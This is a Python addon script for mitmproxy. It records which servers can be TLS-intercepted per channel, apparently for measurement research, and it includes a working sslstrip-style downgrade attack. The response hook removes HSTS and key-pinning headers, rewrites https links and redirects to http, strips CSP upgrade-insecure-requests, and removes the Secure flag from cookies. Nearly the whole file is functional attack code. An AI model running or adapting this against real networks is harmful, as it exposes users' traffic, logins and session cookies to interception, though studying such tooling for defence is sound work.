import collections
import redis
import time
import re
import urllib.parse
import typing  # noqa
import mitmproxy
import logging
import os


from enum import Enum
from mitmproxy import ctx
from mitmproxy.exceptions import TlsProtocolException
from mitmproxy.proxy.protocol import TlsLayer, RawTCPLayer
from mitmproxy import http





class InterceptionResult(Enum):
    success = True
    failure = False
    skipped = None

mitmable = set()
unMitmable = set()

class _TlsStrategy:
    """
    Abstract base class for interception strategies.
    """

    def __init__(self):
        # A server_address -> interception results mapping
        self.history = collections.defaultdict(lambda: collections.deque(maxlen=200))
        self.rName2IPDic = redis.StrictRedis(host='localhost', port=6379, db=0)
        self.rIP2NameDic = redis.StrictRedis(host='localhost', port=6379, db=1)

    def getAssocitatedIPs(self, IPAddress):
        IPList = set([str(IPAddress)])
        hostname = self.rIP2NameDic.get(IPAddress)
        if hostname and hostname in self.rName2IPDic:
            IPList = IPList.union(self.rName2IPDic.get(hostname))
        return list(IPList)
    def getAssociatedDomain(self, IPAddress):
        hostname = ""
        IPList = set([str(IPAddress)])
        if IPAddress in self.rIP2NameDic:
            hostname = self.rIP2NameDic.get(IPAddress)
        return hostname


    def should_intercept(self, server_address):
        """
        Returns:
            True, if we should attempt to intercept the connection.
            False, if we want to employ pass-through instead.
        """
        raise NotImplementedError()

    def record_success(self, server_address):
        portNum = server_address[1]
        self.history[server_address].append(InterceptionResult.success)
        with open(mitmableFileName, 'a') as the_file:
            the_file.write("\"%s\":%s\n" % (str(channel_id), str(server_address)))
            hostname = self.getAssociatedDomain(str(server_address[0]))
            if hostname:
                server_address = (hostname, portNum)
            mitmable.add(server_address)

    def record_failure(self, server_address):
        portNum = server_address[1]
        serverList = self.getAssocitatedIPs(str(server_address[0]))
        for server in serverList:
            server_address_tuple = (server, portNum)
            self.history[server_address_tuple].append(InterceptionResult.failure)
            unMitmable.add(server_address_tuple)

        with open(unMitmableFileName, 'a') as the_file:
            hostname = self.getAssociatedDomain(str(server_address[0]))
            if hostname:
                server_address = (hostname, portNum)
            the_file.write("\"%s\":%s\n" % (str(channel_id), str(server_address)))

            #the_file.write(str(server_address)+":" + str(tls_strategy.should_intercept(server_address)) +'\n')

    def record_skipped(self, server_address):
        self.history[server_address].append(InterceptionResult.skipped)


class ConservativeStrategy(_TlsStrategy):
    """
    Conservative Interception Strategy - only intercept if there haven't been any failed attempts
    in the history.
    """

    def should_intercept(self, server_address):
        if InterceptionResult.failure in self.history[server_address]:
            return False
        return True



class TlsFeedback(TlsLayer):
    """
    Monkey-patch _establish_tls_with_client to get feedback if TLS could be established
    successfully on the client connection (which may fail due to cert pinning).
    """
    def _establish_tls_with_client(self):
        server_address = self.server_conn.address

        try:
            with open('my.log', 'a') as the_file:
                the_file.write("Connecting to %s\n" % str(server_address))
            super(TlsFeedback, self)._establish_tls_with_client()
            with open('my.log', 'a') as the_file:
                the_file.write("Done connecting to %s\n" % str(server_address))
        except TlsProtocolException as e:
            tls_strategy.record_failure(server_address)
            raise e
        else:
            tls_strategy.record_success(server_address)


# inline script hooks below.

tls_strategy = None


def load(l):
    l.add_option(
        "tlsstrat", int, 0, "TLS passthrough strategy (0-100)",
    )
    l.add_option(
        "channel_id", int, 0, "Channel ID",
    )
    l.add_option(
        "data_dir", str, "", "Data dir",
    )
    '''
    try:
        os.remove(mitmableFileName)
        os.remove(unMitmableFileName)
    except Exception:
        pass
    '''


def configure(updated):
    global tls_strategy, channel_id, data_dir, mitmableFileName, unMitmableFileName
    #if ctx.options.tlsstrat > 0:
    #    tls_strategy = ProbabilisticStrategy(float(ctx.options.tlsstrat) / 100.0)
    #else:
    #    tls_strategy = ConservativeStrategy()
    tls_strategy = ConservativeStrategy()
    channel_id = ctx.options.channel_id
    data_dir = ctx.options.data_dir

    base_filename = '{}-{}'.format(
        channel_id,
        int(time.time())
    )
    mitmableFileName = str(data_dir) + "/mitmlog/" + str(base_filename) + '.mitmable'
    unMitmableFileName = str(data_dir) + "/mitmlog/" + str(base_filename) + '.unmitmable'
    LOG_FILE = str(data_dir) + "/mitmlog/" + str(base_filename) + '.strip'
    logging.basicConfig(filename=LOG_FILE,level=logging.DEBUG)

    #os.environ['SSLKEYLOGFILE'] = "~/.mitmproxy/sslkeylogfile.txt"


def next_layer(next_layer):
    """
    This hook does the actual magic - if the next layer is planned to be a TLS layer,
    we check if we want to enter pass-through mode instead.
    """
    if isinstance(next_layer, TlsLayer) and next_layer._client_tls:
        server_address = next_layer.server_conn.address
        #cert = next_layer._find_cert()

        if tls_strategy.should_intercept(server_address):
            # We try to intercept.
            # Monkey-Patch the layer to get feedback from the TLSLayer if interception worked.
            next_layer.__class__ = TlsFeedback
        else:
            # We don't intercept - reply with a pass-through layer and add a "skipped" entry.
            mitmproxy.ctx.log("TLS passthrough for %s" % repr(next_layer.server_conn.address), "info")
            next_layer_replacement = RawTCPLayer(next_layer.ctx, ignore=True)
            next_layer.reply.send(next_layer_replacement)
            tls_strategy.record_skipped(server_address)



"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""


# set of SSL/TLS capable hosts
secure_hosts: typing.Set[str] = set()


def request(flow: http.HTTPFlow) -> None:
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)
    #mitmproxy.ctx.log(
    #    "Request: %s" % repr(flow.request),
    #    "debug")

    # do not force https redirection
    flow.request.headers.pop('Upgrade-Insecure-Requests', None)

    # proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443

        # We need to update the request destination to whatever is specified in the host header:
        # Having no TLS Server Name Indication from the client and just an IP address as request.host
        # in transparent mode, TLS server name certificate validation would fail.
        flow.request.host = flow.request.pretty_host


def response(flow: http.HTTPFlow) -> None:
    #flow.response.headers.pop('Strict-Transport-Security', None)
    #flow.response.headers.pop('Public-Key-Pins', None)
    #mitmproxy.ctx.log(
    #    "Response: %s" % repr(flow.response.content),
    #    "debug")
    if flow.response.headers.pop('Strict-Transport-Security', None):
        #mitmproxy.ctx.log(
        logging.info(
            "Removing header Strict-Transport-Security for %s:%s" % (repr(flow.response), repr(flow.response.port)))
    if flow.response.headers.pop('Public-Key-Pins', None):
        logging.info(
            "Removing header Public-Key-Pins for %s:%s" % (repr(flow.response), repr(flow.response.port)))


    # strip links in response body
    if b'https://' in flow.response.content:
        logging.info(
            "Replacing content: %s" % repr(flow.response.content))
    flow.response.content = flow.response.content.replace(b'https://', b'http://')

    # strip meta tag upgrade-insecure-requests in response body
    csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

    # strip links in 'Location' header
    if flow.response.headers.get('Location', '').startswith('https://'):
        location = flow.response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
            logging.info(
            "Secure Host added: %s" % hostname)
        flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

    # strip upgrade-insecure-requests in Content-Security-Policy header
    if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
        logging.info(
            "upgrade-insecure-requests: %s" % repr(flow.response.headers.get('Content-Security-Policy', '')))
        csp = flow.response.headers['Content-Security-Policy']
        flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
        mitmproxy.ctx.log("Removing upgrade-insecure-requests for %s:%s" % (repr(flow.response.host),repr(flow.response.port)), "warn")

    # strip secure flag from 'Set-Cookie' headers
    cookies = flow.response.headers.get_all('Set-Cookie')
    if cookies:
        for s in cookies:
            if "secure" in s:
                logging.info("Stripping Secure Cookie: %s" % repr(s))
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    flow.response.headers.set_all('Set-Cookie', cookies)

